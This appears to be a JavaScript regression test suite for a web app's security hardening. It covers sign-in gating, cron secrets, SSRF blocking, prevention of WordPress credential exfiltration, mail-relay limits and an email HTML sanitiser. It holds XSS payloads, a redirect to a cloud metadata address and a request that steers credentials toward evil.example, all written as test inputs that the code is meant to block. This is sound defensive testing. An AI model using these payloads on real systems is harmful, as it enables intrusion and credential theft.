// Run by smoke.cjs. Drives the REAL handlers and guards against a stubbed Supabase/Resend/WordPress,
// and asserts the security properties of the 2026-10 hardening. Every case here FAILED before the fix.
import { pathToFileURL, fileURLToPath } from "node:url";
import path from "node:path";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const imp = (rel) => import(pathToFileURL(path.join(ROOT, rel)).href);

process.env.SUPABASE_URL = "https://stub.supabase.co";
process.env.SUPABASE_SERVICE_KEY = "svc";
process.env.VOLT_ADMIN_EMAIL = "joel@smesouthafrica.co.za";
process.env.CRON_SECRET = "s3cret-value";
process.env.RESEND_API_KEY = "re_test";
process.env.WP_URL = "https://93.184.216.34";           // a PUBLIC literal IP, so no DNS is needed in the test
process.env.WP_USER = "org-wp-user";
process.env.WP_APP_PASSWORD = "org-wp-password";
process.env.SECRETS_MASTER_KEY = "a".repeat(64);
delete process.env.UPSTASH_REDIS_REST_URL;
delete process.env.ALLOWED_EMAIL_EXTRA;
delete process.env.ALLOW_UNCONFIRMED_EMAIL;

const CONFIRMED = "2026-09-01T00:00:00Z";
const USERS = {
  joel:      { id: "u-joel",  email: "joel@smesouthafrica.co.za",  email_confirmed_at: CONFIRMED },
  thabo:     { id: "u-thabo", email: "thabo@smesouthafrica.co.za", email_confirmed_at: CONFIRMED },
  faker:     { id: "u-fake",  email: "ceo@smesouthafrica.co.za",   email_confirmed_at: null },          // registered, never confirmed
  nofield:   { id: "u-nf",    email: "amy@smesouthafrica.co.za" },                                      // GoTrue field absent entirely
  outsider:  { id: "u-out",   email: "someone@acme.co.za",         email_confirmed_at: CONFIRMED },
};
let calls = [];
const json = (status, body) => ({ ok: status >= 200 && status < 300, status, headers: new Headers({ "content-type": "application/json" }), json: async () => body, text: async () => JSON.stringify(body), arrayBuffer: async () => new ArrayBuffer(0) });
globalThis.fetch = async (url, init = {}) => {
  const u = new URL(url);
  calls.push({ url: String(url), method: init.method || "GET", headers: init.headers || {}, body: init.body });
  if (u.hostname === "stub.supabase.co") {
    if (u.pathname === "/auth/v1/user") { const t = String(init.headers.Authorization || "").slice(7); return USERS[t] ? json(200, USERS[t]) : json(401, {}); }
    if (u.pathname.startsWith("/rest/v1/org")) return json(200, [{ id: "org-1" }]);
    if (u.pathname.startsWith("/rest/v1/member")) return json(200, [{ user_id: "x" }]);
    return json(200, []);
  }
  if (u.hostname === "api.resend.com") return json(200, { id: "mail-1" });
  if (u.hostname === "93.184.216.34") return json(201, { source_url: "https://wp.example/x.png" });
  return json(200, {});
};

let pass = 0, fail = 0;
function expect(name, cond, detail) { if (cond) { pass++; console.log("  ok   " + name); } else { fail++; console.log("  FAIL " + name + "  → " + JSON.stringify(detail)); } }

async function call(handler, user, { method = "POST", query = {}, body, headers = {} } = {}) {
  let status = 0, payload = null;
  const req = { method, query, body, headers: { authorization: user ? "Bearer " + user : "", origin: "https://tshephos-lab.vercel.app", ...headers }, socket: { remoteAddress: "9.9.9.9" } };
  const res = { setHeader() {}, status(c) { status = c; return this; }, json(b) { payload = b; return this; }, send(b) { payload = b; return this; }, end() { return this; } };
  await handler(req, res);
  return { status, body: payload };
}

const guard = await imp("api/_guard.js");
const net = await imp("api/_net.js");

// ---------------------------------------------------------------- 1. verified sign-in
console.log("Sign-in gate:");
let r = await guard.requireSession({ headers: { authorization: "Bearer faker" } });
expect("an UNCONFIRMED @company address is refused (the open-door hole)", r.error === "EMAIL_UNCONFIRMED", r);
r = await guard.requireSession({ headers: { authorization: "Bearer thabo" } });
expect("a confirmed @company address gets in", !r.error && r.orgId === "org-1", r);
r = await guard.requireSession({ headers: { authorization: "Bearer nofield" } });
expect("a user object WITHOUT the field is not locked out (never fail closed on a missing field)", !r.error, r);
r = await guard.requireSession({ headers: { authorization: "Bearer outsider" } });
expect("a confirmed address outside the company domain is still refused", r.error === "NOT_AUTHORIZED", r);
process.env.ALLOW_UNCONFIRMED_EMAIL = "1";
r = await guard.requireSession({ headers: { authorization: "Bearer faker" } });
expect("the emergency off-switch (ALLOW_UNCONFIRMED_EMAIL=1) works", !r.error, r);
delete process.env.ALLOW_UNCONFIRMED_EMAIL;

// ---------------------------------------------------------------- 2. owner / cron helpers
console.log("Owner + cron helpers:");
expect("owner is an org admin", guard.isOrgAdmin({ user: USERS.joel }) === true);
expect("a teammate on the shared company workspace is NOT", guard.isOrgAdmin({ user: USERS.thabo }) === false);
expect("a personal-address user owns their private workspace", guard.isOrgAdmin({ user: { id: "g1", email: "me@gmail.com" } }) === true);
expect("cron key accepted in the header", guard.cronKeyOk({ headers: { "x-volt-cron": "s3cret-value" }, query: {} }) === true);
expect("cron key in the URL is IGNORED (it would land in access logs)", guard.cronKeyOk({ headers: {}, query: { key: "s3cret-value" } }) === false);
expect("wrong cron key rejected", guard.cronKeyOk({ headers: { "x-volt-cron": "nope" } }) === false);

// ---------------------------------------------------------------- 3. SSRF primitives
console.log("Outbound-request safety:");
const bad = ["127.0.0.1", "10.1.2.3", "172.20.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1", "fe80::1", "::ffff:127.0.0.1", "224.0.0.1"];
expect("every private / metadata / loopback range is flagged", bad.every((ip) => net.isPrivateIp(ip)), bad.filter((ip) => !net.isPrivateIp(ip)));
expect("public addresses are allowed", ["93.184.216.34", "8.8.8.8", "2606:4700:4700::1111"].every((ip) => !net.isPrivateIp(ip)));
expect("localhost / .internal / .local hostnames blocked", ["localhost", "db.internal", "printer.local", "x.localhost"].every((h) => net.isPrivateHost(h)));
let threw = null; try { await net.assertPublicHost("looks-public.example", async () => [{ address: "93.184.216.34" }, { address: "10.0.0.8" }]); } catch (e) { threw = e.message; }
expect("a public-looking NAME that resolves to a private address is blocked", threw === "HOST_NOT_ALLOWED", threw);
threw = null; try { await net.assertPublicHost("ok.example", async () => [{ address: "93.184.216.34" }]); } catch (e) { threw = e.message; }
expect("a name resolving only to public addresses passes", threw === null, threw);

const lookupPublic = async () => [{ address: "93.184.216.34" }];
const mkRes = (status, headers = {}, body = "") => ({ status, ok: status >= 200 && status < 300, headers: new Headers(headers), body: null, arrayBuffer: async () => Buffer.from(body) });
threw = null;
try {
  await net.safeFetch("https://good.example/start", {}, { lookup: async (h) => h === "good.example" ? [{ address: "93.184.216.34" }] : [{ address: "169.254.169.254" }],
    fetchImpl: async (u) => mkRes(302, { location: "http://metadata.evil.example/latest" }) });
} catch (e) { threw = e.message; }
expect("a public URL that REDIRECTS to a private address is blocked mid-chain", threw === "HOST_NOT_ALLOWED", threw);
threw = null;
try { await net.safeFetch("https://good.example/start", {}, { lookup: lookupPublic, fetchImpl: async () => mkRes(302, { location: "http://169.254.169.254/latest/meta-data" }) }); } catch (e) { threw = e.message; }
expect("…including a redirect straight to a literal metadata IP", threw === "HOST_NOT_ALLOWED", threw);
threw = null;
try { await net.safeFetch("https://good.example/loop", {}, { lookup: lookupPublic, fetchImpl: async () => mkRes(302, { location: "/loop" }) }); } catch (e) { threw = e.message; }
expect("a redirect loop stops (max 4 hops)", threw === "TOO_MANY_REDIRECTS", threw);
let seen = [];
const ok = await net.safeFetch("https://good.example/a", {}, { lookup: lookupPublic, fetchImpl: async (u) => { seen.push(u); return u.endsWith("/a") ? mkRes(301, { location: "/b" }) : mkRes(200, {}, "hello"); } });
expect("a normal relative redirect is followed and the body returned", seen.join(",") === "https://good.example/a,https://good.example/b" && ok.buf.toString() === "hello", { seen, body: ok.buf.toString() });
threw = null;
try { await net.safeFetch("https://good.example/big", {}, { maxBytes: 10, lookup: lookupPublic, fetchImpl: async () => mkRes(200, {}, "x".repeat(50)) }); } catch (e) { threw = e.message; }
expect("an oversized body is refused", threw === "TOO_LARGE", threw);
threw = null;
try { await net.safeFetch("ftp://good.example/x", {}, { lookup: lookupPublic, fetchImpl: async () => mkRes(200) }); } catch (e) { threw = e.message; }
expect("non-http(s) schemes are refused", threw === "BAD_PROTOCOL", threw);

// ---------------------------------------------------------------- 4. WordPress credential exfiltration
console.log("WordPress upload:");
const upload = (await imp("api/_routes/upload.js")).default;
const PNG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const send = (headers) => call(upload, "thabo", { method: "POST", body: { dataBase64: PNG, filename: "a.png", contentType: "image/png" }, headers });
calls = [];
r = await send({ "x-wp-url": "https://evil.example" });          // only the URL — the attack
expect("sending ONLY x-wp-url never sends the org's password to that host", !calls.some((c) => c.url.includes("evil.example")), calls.map((c) => c.url));
expect("…the org's own WordPress is used instead, with the org's credentials", calls.some((c) => c.url.startsWith("https://93.184.216.34/") && /^Basic /.test(String(c.headers.Authorization))), calls.map((c) => c.url));
calls = [];
r = await send({ "x-wp-url": "https://10.0.0.5", "x-wp-user": "u", "x-wp-key": "k" });   // a COMPLETE personal set, but internal
expect("a complete personal set pointing at an INTERNAL host is refused", r.status === 400 && !calls.some((c) => c.url.includes("10.0.0.5")), { status: r.status, calls: calls.map((c) => c.url) });
calls = [];
r = await send({ "x-wp-url": "https://93.184.216.34", "x-wp-user": "mine", "x-wp-key": "mykey" });
expect("a complete personal set on a public host still works, with ITS OWN credentials", r.status === 200 && calls.some((c) => c.url.includes("93.184.216.34") && Buffer.from(String(c.headers.Authorization).slice(6), "base64").toString() === "mine:mykey"), { status: r.status });

// ---------------------------------------------------------------- 5. mail relay
console.log("Kit test-send:");
const kit = (await imp("api/_routes/kit.js")).default;
const test = (user, to) => call(kit, user, { method: "POST", body: { action: "test", to, subject: "Hi", html: "<p>x</p>" } });
calls = [];
r = await test("thabo", ["thabo@smesouthafrica.co.za"]);
expect("a member may send a test to their own address", r.status === 200, r);
r = await test("thabo", ["colleague@smesouthafrica.co.za"]);
expect("…or to a teammate on the company domain", r.status === 200, r);
calls = [];
r = await test("thabo", ["victim@gmail.com"]);
expect("…but NOT to an arbitrary outside address (no mail relay under the company's name)", r.status === 403 && r.body.code === "RECIPIENT_NOT_ALLOWED" && !calls.some((c) => c.url.includes("resend")), { status: r.status, calls: calls.map((c) => c.url) });
r = await test("thabo", ["thabo@smesouthafrica.co.za", "victim@gmail.com"]);
expect("…even when one allowed address is mixed in", r.status === 403, r);
r = await test("joel", ["anyone@gmail.com"]);
expect("the workspace owner may test to anyone", r.status === 200, r);

// ---------------------------------------------------------------- 6. owner-only org actions + cron
console.log("Owner-only actions + cron:");
const ig = (await imp("api/_routes/instagram.js")).default;
r = await call(ig, "thabo", { method: "POST", query: { action: "disconnect" }, body: {} });
expect("a teammate cannot disconnect the org's Instagram", r.status === 403 && r.body.code === "OWNER_ONLY", r);
r = await call(ig, "thabo", { method: "POST", query: { action: "connect" }, body: { token: "t" } });
expect("a teammate cannot overwrite the org's Instagram token", r.status === 403 && r.body.code === "OWNER_ONLY", r);
r = await call(ig, "joel", { method: "POST", query: { action: "disconnect" }, body: {} });
expect("the owner can", r.status === 200, r);
r = await call(ig, null, { method: "POST", query: { action: "drain", key: "s3cret-value" }, body: {} });
expect("cron drain with the secret in the URL is rejected", r.status === 401, r);
r = await call(ig, null, { method: "POST", query: { action: "drain" }, body: {}, headers: { "x-volt-cron": "s3cret-value" } });
expect("cron drain with the secret in the header runs", r.status === 200, r);

const tt = (await imp("api/_routes/tiktok.js")).default;
r = await call(tt, "thabo", { method: "POST", query: { action: "disconnect" }, body: {} });
expect("a teammate cannot disconnect the org's TikTok", r.status === 403 && r.body.code === "OWNER_ONLY", r);

// ---------------------------------------------------------------- 7. AI-written email HTML is untrusted
console.log("Email HTML sanitiser:");
const { sanitizeEmailHtml: clean } = await imp("api/_sanitize.js");
const lacks = (html, re) => !re.test(clean(html));
expect("a <script> block is removed", lacks("<p>Hi</p><script>alert(1)</script><p>Bye</p>", /script|alert/i));
expect("an onerror handler is removed", lacks('<img src="x" onerror="alert(1)">', /onerror|alert/i));
expect("an unquoted onclick is removed but the link survives", (() => { const o = clean('<a href="https://a.co/x" onclick=alert(1)>go</a>'); return !/onclick|alert/i.test(o) && /href="https:\/\/a\.co\/x"/.test(o); })());
expect("a javascript: link is neutralised", lacks('<a href="javascript:alert(1)">x</a>', /javascript:/i));
expect("a data:text/html link is neutralised", lacks('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', /data:text\/html/i));
expect("nested/obfuscated script tags don't survive the clean-up", lacks("<scr<script>ipt>alert(1)</scr</script>ipt>", /<\s*script/i));
expect("iframes, forms and SVG onload are removed", lacks('<iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name=a></form><svg onload="alert(1)"></svg>', /iframe|<form|<svg|onload/i));
const real = '<!--[if mso]><v:roundrect href="https://ok.co" style="height:44px"><![endif]--><table role="presentation" width="100%" style="font-family:Roboto,Arial"><tr><td><h2 style="margin:0">Funding news</h2><p style="color:#333">Hello <a href="https://smesouthafrica.co.za/x?utm_source=volt" target="_blank" style="color:#9c1c1f">read more</a></p><img src="https://smesouthafrica.co.za/a.png" alt="x" width="600"><img src="data:image/png;base64,iVBORw0KGgo=" alt="y"></td></tr></table>';
expect("a REAL newsletter (tables, inline styles, https links/images, data:image, Outlook conditionals) is left untouched", clean(real) === real, clean(real));

console.log("\n" + pass + " passed, " + fail + " failed");
process.exit(fail ? 1 : 0);
